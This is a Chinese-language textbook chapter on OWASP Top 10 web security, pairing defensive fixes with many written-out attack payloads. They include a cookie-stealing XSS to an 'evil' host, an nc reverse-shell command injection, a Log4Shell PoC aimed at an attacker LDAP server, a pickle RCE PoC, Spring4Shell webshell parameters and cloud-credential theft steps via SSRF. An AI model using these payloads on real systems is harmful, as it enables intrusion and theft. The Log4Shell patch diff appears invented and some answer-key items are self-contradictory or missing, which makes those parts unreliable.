# 第 5 章 Web 应用安全（OWASP Top 10 深入）

## 5.1 学习目标

1. 吃透 OWASP Top 10 (2021) 的成因、利用、修复，并能映射到具体 CWE。
2. 能熟练使用 Burp Suite / sqlmap / ffuf / nuclei 等武器库。
3. 掌握从代码审计角度定位漏洞的思路（Source / Sink / Sanitizer 模型）。
4. 构建防御组合拳：CSP、WAF、OAuth、JWT、SameSite Cookie 最佳实践。
5. 能从 Log4Shell、Spring4Shell、GitLab CE path traversal 等真实 CVE 中提炼通用经验。
6. 理解现代 Web 攻击面变化：API、GraphQL、WebSocket、Server Components、Edge Runtime。

**能力矩阵**：

| 能力域 | 入门 | 进阶 | 精通 |
|--------|------|------|------|
| 工具 | Burp 抓包重放 | sqlmap / nuclei 高效组合 | 写 Burp 插件 / Nuclei 模板 |
| 漏洞 | 复现 OWASP Juice Shop | 自主挖到中危 | 调链 Log4Shell / Spring4Shell |
| 修复 | 知道哪些 API 安全 | 能写 Semgrep 规则 | 从架构层降低整类漏洞 |

---

## 5.2 OWASP Top 10 (2021) 速览

| 编号 | 名称 | 2017 对应 |
|------|------|----------|
| **A01** | Broken Access Control 失效的访问控制 | ↑ 从 A5 |
| **A02** | Cryptographic Failures 加密失败 | A3 改名 |
| **A03** | Injection 注入 | ↓ 从 A1 |
| **A04** | Insecure Design 不安全设计 | 新增 |
| **A05** | Security Misconfiguration 安全配置错误 | ↑ |
| **A06** | Vulnerable & Outdated Components | ↑ |
| **A07** | Identification & Authentication Failures | ↓ |
| **A08** | Software & Data Integrity Failures | 新增 |
| **A09** | Security Logging & Monitoring Failures | ↑ |
| **A10** | Server-Side Request Forgery (SSRF) | 新增 |

OWASP API Security Top 10 (2023) 与 LLM Top 10 (2024) 是 Web Top 10 的子集 + 扩展，详见 Ch12。

---

## 5.3 HTTP 协议基础与 Web 安全模型

### 5.3.1 HTTP 请求结构

```
GET /api/orders/123?detail=full HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Cookie: session=abc; csrf=xyz
Authorization: Bearer eyJhbGciOi...
X-Forwarded-For: 1.2.3.4
Content-Type: application/json
Content-Length: 0

```

每个红线字段都是攻击面：`Host` 头注入、`User-Agent` 注入日志、`X-Forwarded-For` 伪造来源 IP、`Authorization` 弱密钥伪造。

### 5.3.2 Cookie 属性详表

| 属性 | 含义 |
|------|------|
| `Domain=` | 适用域；`.example.com` 包含子域 |
| `Path=` | 适用路径前缀 |
| `Expires=` / `Max-Age=` | 过期 |
| `Secure` | 仅 HTTPS 发送 |
| `HttpOnly` | JS 不可读取（防大部分 XSS 偷 cookie） |
| `SameSite=Strict/Lax/None` | 防 CSRF |
| `Partitioned` (CHIPS) | 跨站第三方 cookie 分区 |
| `__Host-` 前缀 | 强制 Secure + Path=/ + 无 Domain |
| `__Secure-` 前缀 | 强制 Secure |

### 5.3.3 同源策略 (SOP) vs CORS vs CSP

**SOP**：浏览器默认禁止 JS 跨源读取响应（同源 = 协议+主机+端口）。
**CORS**：服务端通过 `Access-Control-Allow-Origin` 等响应头明确允许特定跨源读取。
**CSP**：限制页面自身可加载的资源、可执行脚本来源。

```
SOP   → 浏览器内置默认拒绝
CORS  → 服务端"放行"特定来源
CSP   → 页面"自我约束"加载/执行
```

### 5.3.4 重要安全响应头

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{rand}'; object-src 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-site
Cache-Control: no-store
```

---

## 5.4 A03：注入（Injection）

### 5.4.1 SQL 注入分类与 Payload 推导

#### Union-based

需要回显字段数对齐：

```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3,database()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

#### Error-based（MySQL 5.x）

```sql
' AND extractvalue(1, concat(0x7e, (SELECT user())))--
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--
```

#### Boolean Blind（按响应分支）

```sql
' AND SUBSTR((SELECT user()),1,1) > 'm'--
```

二分法 7 次比较即可定位单字符。

#### Time-based Blind

```sql
' AND IF(SUBSTR(user(),1,1)='r',SLEEP(3),0)--
'; WAITFOR DELAY '0:0:3'--               -- MSSQL
' AND pg_sleep(3)--                      -- PostgreSQL
```

#### Out-of-Band (OOB)

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.dnslog.cn\\x'))--
EXEC master..xp_dirtree '\\attacker\share\file.txt'   -- MSSQL
```

#### 二阶 SQL 注入 (Second-Order)

```python
# 第一阶段：注册 username = "admin'--"
# 第二阶段：用户改密码：UPDATE users SET pwd=? WHERE username='admin'--'
# 注入点在第二个查询而非第一个
```

### 5.4.2 sqlmap 实战参数

```bash
sqlmap -u "https://t/?id=1" --dbs --batch --random-agent
sqlmap -u "https://t/" --data="user=a&pass=b" --level=3 --risk=2 --threads=4
sqlmap -r req.txt --tamper=between,space2comment,charunicodeencode
sqlmap -u "..." --os-shell                # 尝试拿 shell
sqlmap -u "..." --tor --tor-type=SOCKS5 --check-tor
```

### 5.4.3 Java JDBC 代码审计 diff

```diff
- String sql = "SELECT * FROM users WHERE id = '" + req.getParameter("id") + "'";
- Statement stmt = conn.createStatement();
- ResultSet rs = stmt.executeQuery(sql);
+ String sql = "SELECT * FROM users WHERE id = ?";
+ PreparedStatement stmt = conn.prepareStatement(sql);
+ stmt.setString(1, req.getParameter("id"));
+ ResultSet rs = stmt.executeQuery();
```

### 5.4.4 Python SQLAlchemy 反例

```python
# 错（即便用了 ORM，raw 拼接仍有注入）
session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# 对
session.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})
```

### 5.4.5 NoSQL 注入

#### MongoDB

```javascript
// 登录绕过
{ "username": {"$ne": null}, "password": {"$ne": null} }
{ "username": "admin", "password": {"$gt": ""} }
{ "$where": "this.password == this.username" }
```

#### Redis

```redis
EVAL "redis.call('CONFIG','SET','dir','/var/spool/cron'); ..." 0
```

历史上利用未授权 Redis 写入 SSH key、crontab、SSRF gopher 攻击。

### 5.4.6 OS 命令注入

```bash
ip=127.0.0.1;cat /etc/passwd
ip=127.0.0.1|nc attacker 4444 -e /bin/sh
ip=$(whoami)
ip=`id`
ip=127.0.0.1%0Acat%20/etc/passwd        # \n
```

#### 安全替代

```python
import subprocess
subprocess.run(["ping", "-c", "1", host], shell=False, check=True)
```

绝不要把用户输入和 shell 元字符放一起；`shell=False` + 列表参数是黄金法则。

### 5.4.7 SSTI（Server-Side Template Injection）

#### Jinja2

```python
{{ ''.__class__.__mro__[2].__subclasses__()[59]
    .__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

#### Twig

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

#### 检测 payload 矩阵

| 引擎 | 试探 | 返回 |
|------|------|------|
| Jinja2 | `{{7*7}}` | `49` |
| Twig | `{{7*7}}` | `49` |
| Mako | `${7*7}` | `49` |
| ERB | `<%= 7*7 %>` | `49` |
| FreeMarker | `${7*7}` | `49` |
| Velocity | `#set($x=7*7)$x` | `49` |

### 5.4.8 LDAP / XPath 注入

```
(&(uid=*)(userPassword=*))      LDAP 通配登录
' or '1'='1                     XPath
```

### 5.4.9 LOG 注入与 Log4Shell

`log4j` 的 JNDI 查找特性 → 见 §5.13 CVE 复盘。

---

## 5.5 A01：失效的访问控制

### 5.5.1 IDOR（Insecure Direct Object Reference）

```
GET /api/orders/123  →  改成 124 看到别人的订单
GET /api/users/me    →  改成 /api/users/2
```

### 5.5.2 水平 / 垂直越权

| 类型 | 示例 |
|------|------|
| 水平 | 用户 A 访问用户 B 的资源 |
| 垂直 | 普通用户执行管理员接口 |

### 5.5.3 越权测试清单

- [ ] 修改 URL 参数 ID / UUID
- [ ] 修改 Cookie / JWT 中的 `role`
- [ ] HTTP 方法切换（GET ↔ POST ↔ PUT ↔ DELETE）
- [ ] 访问后台接口（`/admin/*`）
- [ ] 多租户跨租户数据
- [ ] HTTP 头伪装：`X-Original-URL` / `X-Rewrite-URL` 绕过反代
- [ ] 路径大小写 / 末尾斜杠 / `.json` 后缀 / `;jsessionid=` 等绕过

### 5.5.4 防御

- 每个接口 **后端强制鉴权**，不信任前端
- 使用 ACL / RBAC / ABAC
- UUID 替代自增 ID（缓解枚举）
- 中间件统一鉴权 + 单元测试覆盖

### 5.5.5 真实经典：GitLab CE Path Traversal (CVE-2024-0402)

GitLab 的 `Workhorse` 上传路径 `..` 未规范化 → 攻击者上传至任意路径，配合 git hooks 写入实现 RCE。补丁：在 Workhorse 与 Rails 双层做 `path.Clean` + 白名单根目录前缀。

---

## 5.6 跨站脚本 XSS

### 5.6.1 类型

| 类型 | 描述 |
|------|------|
| **反射型** | payload 在 URL，受害者点击触发 |
| **存储型** | payload 存数据库，所有访问者触发 |
| **DOM 型** | 纯前端 sink，`innerHTML`、`document.write` |
| **Mutation (mXSS)** | 浏览器对不规范 HTML 的"修复"产生的二次解析 |
| **UXSS (Universal)** | 浏览器自身漏洞，跨 origin 注入 |

### 5.6.2 Payload 仓库

```html
<script>fetch('//evil/?'+document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">x</a>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
"><script>alert(1)</script>
```

### 5.6.3 上下文与编码矩阵

| 上下文 | 必需编码 |
|--------|---------|
| HTML 文本 | `&lt; &gt; &amp; &quot;` |
| HTML 属性（双引号包裹） | 同上 + `&#x27;` |
| `<script>...</script>` 内 JS | JS 字符串编码 + 严防 `</script>` |
| URL 参数 | `encodeURIComponent` |
| CSS | `\HH ` 16 进制 |
| JSON 嵌入页面 | `</`→`<\/` |

### 5.6.4 CSP 配置最佳实践

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests;
  report-to csp-report;
```

**陷阱**：

- `'unsafe-inline'` + `'self'` ≈ 没开
- 旧 CDN 的 JSONP endpoint 是 CSP 的隐形漏洞
- `script-src 'self'` 时仍可能通过文件上传到同源加载脚本

### 5.6.5 DOMPurify 与 Trusted Types

```javascript
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput, {
  USE_PROFILES: { html: true }
});
```

**Trusted Types**（Chrome 83+）强制脚本注入点必须传 `TrustedScript` 对象，从根本封堵 DOM XSS。

### 5.6.6 React 反例

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />   // ❌
<div>{userInput}</div>                                    // ✅ 默认转义
```

### 5.6.7 真实 mXSS：jQuery 3.x 的 `<x>` 重组

`$("<div>").html("<x><option><style></option></style></x>")` 经过浏览器重整 + jQuery 二次解析后产生越权脚本节点。修复：升级到含 mXSS 防护的版本，并改用 `.text()`。

---

## 5.7 跨站请求伪造 CSRF

### 5.7.1 原理

浏览器自动携带 Cookie → 攻击页面伪造表单提交。

```html
<form action="https://bank.example.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="9999">
</form>
<script>document.forms[0].submit()</script>
```

### 5.7.2 防御组合

- **SameSite Cookie**：`Lax`（默认 GET 跨站允许）/`Strict`（不允许任何跨站）
- **CSRF Token**：随机 + 校验 + 与 session 绑定
- 关键操作二次认证（短信 / 密码）
- CORS 严格配置（`Access-Control-Allow-Origin` 不能 `*` + `Credentials`）
- `Origin` / `Referer` 校验
- Double Submit Cookie 模式

### 5.7.3 SameSite 演进

- Chrome 80 (2020) 默认 `Lax`
- Chrome 91+ Schemeful Same-Site：`http://example.com` 与 `https://example.com` 视为不同站点
- 第三方 Cookie 渐进退场（CHIPS / Storage Access API）

---

## 5.8 A10：服务端请求伪造 SSRF

### 5.8.1 典型场景

- 图片外链获取
- Webhook
- 文档解析（PDF → 服务端 fetch 外链 CSS）
- URL 预览（IM、社交平台）

### 5.8.2 利用矩阵

```
http://internal-service:8080/admin
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
http://metadata.google.internal/computeMetadata/v1/                # GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01    # Azure
file:///etc/passwd
gopher://localhost:6379/_SET key value    # Redis RCE
dict://localhost:11211/stats              # memcached
ldap://localhost:389/                      # LDAP
sftp:// , tftp:// , imap://                # 取决于 PHP fopen wrappers
```

### 5.8.3 云元数据接管全流程（AWS）

```
1. SSRF 访问 http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. 列出当前实例 IAM Role 名称，例如 ec2-app-role
3. GET .../iam/security-credentials/ec2-app-role
   → 返回 AccessKeyId / SecretAccessKey / Token
4. 用 aws cli 配置临时凭证：aws s3 ls / iam list-users
5. AssumeRole 横向到更高权限账号
6. 数据外带（S3 sync）/ 持久化（创建 IAM 用户）
```

**IMDSv2** 防御：要求 `PUT /latest/api/token` 取 token 后再访问 metadata；GET 单步 SSRF 失效。

### 5.8.4 SSRF 绕过技巧

- 短地址 / 301 重定向
- DNS Rebinding（第一次返回公网 IP，第二次返回 127.0.0.1）
- 十进制 IP（`http://2130706433/` = 127.0.0.1）
- 八进制 / 十六进制：`http://0177.0.0.1/`、`http://0x7f000001/`
- IPv6：`http://[::1]/`、`http://[::ffff:127.0.0.1]/`
- 0.0.0.0、127.1、127.0.1、`localhost.attacker.com` 解析回 127
- URL 解析差异：`http://attacker.com#@127.0.0.1/`

### 5.8.5 防御

- 白名单目标域 / IP
- 禁止访问私有网段（10/8、172.16/12、192.168/16、169.254/16、`fc00::/7`、`::1`）
- 关闭 HTTP 重定向跟随或重新校验
- 使用专用代理服务，业务层不直接 fetch
- 对 metadata 端点强制 IMDSv2

---

## 5.9 文件上传漏洞

### 5.9.1 攻击链

```
上传 shell.php  →  绕过过滤  →  访问执行  →  RCE
```

### 5.9.2 绕过技巧

- 大小写 `.PhP` / `.pHp5`
- 双扩展 `shell.jpg.php`
- 解析漏洞：`shell.php/.` (Apache)、`shell.asp;.jpg` (IIS6)
- 内容类型 `Content-Type: image/jpeg` 伪造
- 图片马 `copy /b 1.jpg + shell.php 2.jpg`
- `.htaccess` 覆盖解析（旧 Apache）
- 0x00 截断（老 PHP）
- `phar://` 反序列化

### 5.9.3 防御

- 白名单扩展名 + MIME + magic bytes 三重校验
- 重命名（UUID）+ 单独存储桶 + 不允许执行
- 图片二次编码（可破坏里面的 payload）
- CDN + 独立域名托管静态资源
- 服务器配置：上传目录 `Options -ExecCGI`，禁止 PHP/JSP 解析

---

## 5.10 反序列化漏洞

### 5.10.1 典型语言

- **Java**：Fastjson、Jackson、Shiro、Weblogic、Struts2
- **PHP**：魔术方法 `__wakeup` `__destruct`
- **Python**：`pickle.loads`、`PyYAML.load`（非 safe_load）
- **Ruby on Rails**：`Marshal.load`、`YAML.load`
- **.NET**：BinaryFormatter、`TypeNameHandling`

### 5.10.2 攻击链工具

- Java：`ysoserial`、`marshalsec`
- PHP：`phpggc` 自动生成 POP 链
- Python：`pickle.dumps(Exploit())`
- .NET：`ysoserial.net`

### 5.10.3 Python pickle PoC

```python
import pickle, os, base64

class Exp:
    def __reduce__(self):
        return (os.system, ('id > /tmp/p',))

payload = base64.b64encode(pickle.dumps(Exp())).decode()
# 当受害者 pickle.loads(base64.b64decode(payload)) 时触发
```

### 5.10.4 Java commons-collections gadget 概念

```
ChainedTransformer
  → InvokerTransformer.transform("getRuntime") on Class
  → InvokerTransformer.transform("invoke") + "exec" + cmd
  打包进 LazyMap → MapEntry → AnnotationInvocationHandler
  反序列化时 readObject → 调用 Map.entrySet() → 触发链
```

### 5.10.5 修复

- 禁止不可信反序列化
- 使用 JSON / protobuf / MessagePack 替代
- 白名单类（Jackson `DefaultTyping` 必须关闭）
- Java：`ObjectInputFilter`（JEP 290）
- Python：`yaml.safe_load`、避免 pickle 处理外部数据

---

## 5.11 身份认证 / 会话

### 5.11.1 常见缺陷

- 明文传输口令
- 暴力破解无限流
- Session 固定 / 劫持
- Remember Me Cookie 无签名
- OAuth `redirect_uri` 未校验
- JWT `alg: none` / RS→HS 混淆
- 密码重置 token 可预测（基于时间戳 + 用户 ID）

### 5.11.2 OAuth 2.0 最佳实践

- 使用 **Authorization Code + PKCE**（即便公共客户端）
- `state` 防 CSRF
- `redirect_uri` 严格白名单 + 精确匹配（不允许通配 / 子路径）
- Access Token 短有效期（≤ 1h）+ Refresh Token 轮换
- 不要用 Implicit / ROPC Flow（已被 OAuth 2.1 移除）
- `id_token` 永远本地校验签名

### 5.11.3 OAuth 攻击面

- `redirect_uri` 路径劫持：`https://app.com/callback/../redirect?to=evil`
- 跨账号 `code` 重用：服务端未绑定 `code` 与 `client_id`
- IDP Confused Deputy：用户在不同 IDP 登录后 token 串
- 第三方 sub claim 不固定（同一邮箱不同账号）

### 5.11.4 JWT 深坑

```
alg=none 绕过：服务端代码 verify(token, key) 把 None 当合法
RS→HS 混淆：服务端把公钥当 HMAC 密钥
弱 secret：hashcat -m 16500 jwt.txt rockyou.txt
kid 注入：kid 走 SQL → 任意值导致 fall through
jku/x5u 外连：服务端去攻击者控制的 URL 取 JWK
```

#### 修复模板（Node.js）

```javascript
const jwt = require('jsonwebtoken');
jwt.verify(token, PUBLIC_KEY, {
  algorithms: ['RS256'],   // ← 强制白名单
  audience: 'my-api',
  issuer: 'https://idp.example.com',
});
```

### 5.11.5 双因素（2FA）

- TOTP（Google Authenticator / Authy）
- WebAuthn / Passkey（公钥签名，最安全）
- 避免仅短信 2FA（SIM Swap）

---

## 5.12 业务逻辑漏洞

| 类别 | 例子 |
|------|------|
| 竞态条件 | 优惠券同一时刻多次扣减 / 转账 |
| 数值溢出 | 价格 -1 元购买 |
| 状态机错位 | 直接跳过支付步骤到出货 |
| 权限提升 | 通过加好友绕过隐私设置 |
| 计费绕过 | 上传文件计费但有未鉴权预览 |
| 验证码失效 | 同一验证码可多次使用 / 永不过期 |

### 5.12.1 竞态条件 (Race Condition) 复现

```python
import threading, requests
def buy():
    requests.post("https://t/buy", json={"coupon": "ONLY_ONE"}, cookies=COOK)
threads = [threading.Thread(target=buy) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

PortSwigger 的 "single packet attack"：把多个 HTTP/2 请求装进一个 TCP 包，可达到亚毫秒级并发到达，绕过普通时序锁。

---

## 5.13 真实 CVE 深度复盘

### 5.13.1 Log4Shell (CVE-2021-44228)

**成因**：log4j-core 2.0–2.14.x 在格式化日志字符串时，把 `${jndi:ldap://...}` 模式作为 lookup 解析，触发 JNDI 远程加载类。

**PoC**：

```bash
# 1. 攻击者起 LDAP 服务返回 reference 指向恶意 codebase
java -jar marshalsec.jar LDAPRefServer "http://attacker:8888/#Exploit"

# 2. 任意能进 log4j 的字段
curl https://t/login -H "User-Agent: \${jndi:ldap://attacker:1389/Exploit}"
# 或：搜索框、X-Api-Version、HTTP Header、邮件主题... 任何 log.info(变量) 处
```

**完整链**：

```
log.info(userInput)
  → MessagePatternConverter.format()
    → StrSubstitutor.replace()
      → JndiLookup.lookup("ldap://attacker/...")
        → InitialContext.lookup()
          → LDAP 返回 javaCodebase=http://...class
            → ClassLoader.defineClass(Exploit) → static {} 块执行任意代码
```

**补丁对比**：

```diff
// PatternLayout.java (2.15.0)
+ if (LOG4J2_DISABLE_JMX_DEFAULT) {
+     return false;
+ }
- // JNDI lookup enabled by default
+ // JNDI lookup disabled (2.16.0 完全移除)
```

2.17.0 又修复 CVE-2021-45105 (DoS via `${ctx:loginId}` 递归)。

**检测**：
- 网络层：扫 `${jndi:` 字符串模式
- 主机层：进程是否启动了 `java` 子进程或 `ldap.naming.provider.url`
- Log: 搜索 `jndi:ldap`/`jndi:rmi`/`jndi:dns`/`jndi:nis`

### 5.13.2 Spring4Shell (CVE-2022-22965)

JDK 9+ Spring Beans 通过 `class.module.classLoader` 暴露 ClassLoader → 攻击者可改 Tomcat 日志路径写入 JSP webshell。

```
?class.module.classLoader.resources.context.parent.pipeline.first.pattern=
%25{c2}i if(...){Runtime.getRuntime().exec(request.getParameter(\"c\")) }
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
```

**补丁**：5.3.18/5.2.20 拒绝 `class*` 类型字段绑定。

### 5.13.3 GitLab CE Path Traversal (CVE-2023-4998 / CVE-2024-0402)

`Workhorse` 上传组件未规范化 `..`，攻击者上传文件至 git 仓库 hooks 目录 → 推送时执行任意命令。补丁：双层 `filepath.Clean` + 白名单根目录。

### 5.13.4 Confluence OGNL (CVE-2022-26134)

`/admin/*` 路径绕过过滤后 OGNL 表达式注入：

```
${(#a=@org.apache.commons.io.IOUtils@toString(...exec("id"))).toString()}
```

### 5.13.5 Microsoft Exchange ProxyShell (CVE-2021-34473/34523/31207)

三链组合：自动发现路径混淆 → SSRF → PowerShell remoting → mailbox writeback → webshell。

---

## 5.14 API 安全（OWASP API Top 10 2023）

| 编号 | 名称 |
|------|------|
| API1 | Broken Object Level Authorization |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | SSRF |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

### 5.14.1 GraphQL 风险

- **Introspection** 暴露完整 schema
- **嵌套查询 DoS**：循环 query → CPU 耗尽
- **Batching 爆破**：同一请求里塞 1000 个 mutation 试登录
- **Field 级越权**：mutation 只校验 root，没校验子字段
- **Persisted Queries 缺失**：客户端任意 query → 防御深度低

### 5.14.2 GraphQL 防御

```javascript
// graphql-armor 配置
const armor = new ApolloArmor({
  maxDepth: { n: 6 },
  maxAliases: { n: 15 },
  costLimit: { maxCost: 5000 },
  blockFieldSuggestion: { enabled: true },
});
```

### 5.14.3 gRPC 安全要点

- 必须启用 mTLS
- `grpc.max_message_size` 限制（默认 4 MB）
- 反射服务（`grpc.reflection`）生产环境关闭
- Interceptor 实现统一鉴权 + 限流

---

## 5.15 武器库速查

| 工具 | 用途 |
|------|------|
| **Burp Suite** | 手工测试必备 |
| **OWASP ZAP** | 开源替代 |
| **sqlmap** | SQL 注入自动化 |
| **XSStrike** | XSS |
| **ffuf / dirsearch / feroxbuster** | 目录爆破 |
| **nuclei** | 模板化扫描 |
| **wappalyzer** | 指纹识别 |
| **wfuzz / Intruder** | 参数爆破 |
| **jwt_tool** | JWT 攻击 |
| **Postman + Newman** | API 测试 |
| **mitmproxy** | 移动 HTTPS 中间人 |
| **httpx / katana** | URL 探测 / 爬虫 |

### 5.15.1 推荐 Burp 插件

- `Active Scan++`：增强主动扫描
- `JWT Editor`：JWT 攻击
- `Logger++`：高级日志过滤
- `Autorize`：自动越权测试
- `Param Miner`：隐藏参数
- `Turbo Intruder`：高并发攻击（race condition）
- `Hackvertor`：编码转换

---

## 5.16 代码审计实战

### 5.16.1 Node.js / Express 反例

```javascript
// ❌ 路径遍历 + 命令注入 + XSS 同时存在
app.get('/file', (req, res) => {
  const filename = req.query.f;
  const data = fs.readFileSync(`/var/data/${filename}`);
  exec(`grep ${req.query.q} ${filename}`, (err, out) => {
    res.send(`<h1>${req.query.title}</h1><pre>${out}</pre>`);
  });
});
```

修复：

```javascript
const path = require('path');
const { execFile } = require('child_process');
const escapeHtml = require('escape-html');

app.get('/file', (req, res) => {
  const filename = path.basename(req.query.f || '');         // 防遍历
  const target = path.join('/var/data', filename);
  if (!target.startsWith('/var/data/')) return res.status(400).end();
  execFile('grep', [req.query.q, target], (err, out) => {     // 防命令注入
    res.send(`<h1>${escapeHtml(req.query.title)}</h1>`        // 防 XSS
           + `<pre>${escapeHtml(out)}</pre>`);
  });
});
```

### 5.16.2 PHP 反例

```php
// ❌
$page = $_GET['page'];
include($page . '.php');                           // LFI / RFI
echo $_GET['name'];                                // XSS
mysqli_query($conn, "SELECT * FROM u WHERE id=" . $_GET['id']);  // SQLi
```

修复：

```php
$ALLOWED = ['home', 'about', 'contact'];
$page = in_array($_GET['page'], $ALLOWED, true) ? $_GET['page'] : 'home';
include __DIR__ . "/pages/{$page}.php";
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
$stmt = $conn->prepare("SELECT * FROM u WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

### 5.16.3 Python Flask 反例

```python
# ❌
@app.route('/render')
def render():
    template = f"<h1>Hi {request.args.get('n')}</h1>"
    return render_template_string(template)        # SSTI

@app.route('/cmd')
def cmd():
    return os.popen(request.args.get('c')).read()  # RCE
```

修复：

```python
@app.route('/render')
def render():
    return render_template_string("<h1>Hi {{ n }}</h1>",
                                   n=request.args.get('n'))

# /cmd 接口直接删除；如必须 → 白名单 + execv
```

### 5.16.4 Semgrep 自定义规则

```yaml
rules:
  - id: python-eval-on-userinput
    pattern-either:
      - pattern: eval($X)
      - pattern: exec($X)
    pattern-not: eval("...")
    metadata:
      cwe: 'CWE-95'
      severity: ERROR
    message: Avoid eval/exec on user input.
    languages: [python]
```

---

## 5.17 WAF / 防御纵深

### 5.17.1 WAF 工作模式

- 黑名单（特征匹配）→ 易绕过
- 白名单（合法行为画像）→ 实施成本高
- 机器学习（如 ModSecurity + CRS + ML extension）

### 5.17.2 常见 WAF 绕过

- 编码：URL / Unicode / HTML 实体 / 双重 URL 编码
- 大小写：`SeLeCt`、`UnIoN`
- 注释：`/**/`、`/*!50000UNION*/`
- 拼接：`U`+`N`+`I`+`O`+`N`
- HPP（HTTP Parameter Pollution）：`?id=1&id=2`
- 字符串截断：超长 `User-Agent` 撞 WAF buffer
- HTTP/2 走 HTTP Smuggling 绕前置代理

### 5.17.3 ModSecurity CRS 简介

OWASP Core Rule Set 是开源 WAF 规则库，包含 SQLi/XSS/LFI/RCE/Scanner/Bot 等几十类。建议先 `paranoia level 1` 上线，逐步升级。

---

## 5.18 练习题

1. SQL 注入一字段为数字但被过滤空格？写出 4 种替代方案。
2. 限制了 `union` 关键字怎么办？至少 3 种绕过。
3. XSS 中 `<` `>` 被过滤？写一个不需要这两符号的 payload。
4. 文件上传只允许图片？给出 3 种 RCE 思路。
5. SSRF 限制 `http://`？列出至少 5 种 scheme + 它们的典型滥用。
6. JWT 弱密钥爆破用什么工具？写出 hashcat 命令。
7. CSP `script-src 'self' 'nonce-xxx'` 能被什么绕过？至少 2 种思路。
8. 写一个 PoC：通过 IMDSv1 SSRF 拿到 EC2 凭证并列 S3。
9. 解释 Log4Shell 完整 JNDI + LDAP 加载链，写出关键 4 个 Java 类。
10. 写 Semgrep 规则检测 Java 中 `Runtime.exec` 的字符串拼接调用。

### 参考答案要点

1. `/**/`、`%09`(TAB)、`%0a`(LF)、`%a0`、`+`、`%23` 注释截断
2. `UnIoN`、`UNI/**/ON`、`||` 拼接构造、双写 `unionunion`
3. `<svg/onload=alert(1)>` 用 `&lt;`+`&gt;` 不行；可用 SVG 不带 `<>` 不可能 → 但可用属性注入：`" onload=alert(1) x="`，前提逃逸出某属性
4. 图片马 + 解析漏洞、`.htaccess` 重写、phar://、SVG XXE
5. `file://`、`gopher://`、`dict://`、`ldap://`、`ftp://`、`tftp://`、`sftp://`、`jar://`、`netdoc://`
6. `jwt_tool -C`、`hashcat -m 16500 jwt.txt rockyou.txt`
7. JSONP endpoint、上传 JS 同源、Angular template 注入、`<base>` 标签篡改、不规范的 `'strict-dynamic'` + `nonce` 泄露
9. `JndiLookup` → `InitialContext` → `LdapCtxFactory` → `ClassLoader.defineClass`
10. 模式：`Runtime.exec($X + $Y)` 或 `Runtime.exec(...)` 配合 `taint-mode: true`

---

## 5.19 面试高频考点（附参考答案）

**Q1**：CSRF 与 XSS 的根本差异？
- XSS 是注入脚本到页面，攻击者控制 JS；CSRF 是利用受害者已认证 cookie 让其代发请求。XSS 几乎可绕过任何 CSRF token。

**Q2**：SameSite=Lax 防住 CSRF 了吗？
- 防住大多数 POST 表单；GET 仍允许跨站（用户点击链接），所以"读敏感数据 GET"仍需要 CSRF token 或 Referer 校验。

**Q3**：CSP 是不是 XSS 银弹？
- 不是。需要 + 输入校验 + 输出编码 + Trusted Types。CSP 是纵深防御一层。

**Q4**：JWT vs Session Cookie 哪个更安全？
- 各有取舍。Session cookie 集中管理易吊销；JWT 无状态扩展好但吊销难。建议短 JWT + Refresh Token + 集中黑名单。

**Q5**：Log4Shell 为何影响如此广？
- log4j 是 Java 生态默认日志库；JNDI lookup 历史功能默认启用；任何能进日志的字段都成为攻击面（HTTP header、用户名、邮件主题、设备型号）。

**Q6**：SSRF 能造成什么后果？
- 内网端口扫描、读取 metadata 拿云凭证、攻击内网未鉴权服务（Redis/Elastic/Memcached）、绕过基于 IP 的 ACL。

**Q7**：什么是 CSP 的 `'strict-dynamic'`？
- 由"trusted" script（带 nonce/hash）动态加载的 script 也被信任，省去对 CDN 维护白名单。

**Q8**：HTTP/2 与 HTTP/1.1 在 Smuggling 上有什么变化？
- HTTP/2 取消了 Transfer-Encoding 与 Content-Length 二义性，但前后端协议不一致（H2→H1 降级）反而引入新 smuggling。

**Q9**：CORS `Access-Control-Allow-Origin: *` 与 `Credentials: true` 同时设置会怎样？
- 浏览器拒绝携带 cookie；规范不允许这种组合；常见误解。

**Q10**：如何防御原型链污染？
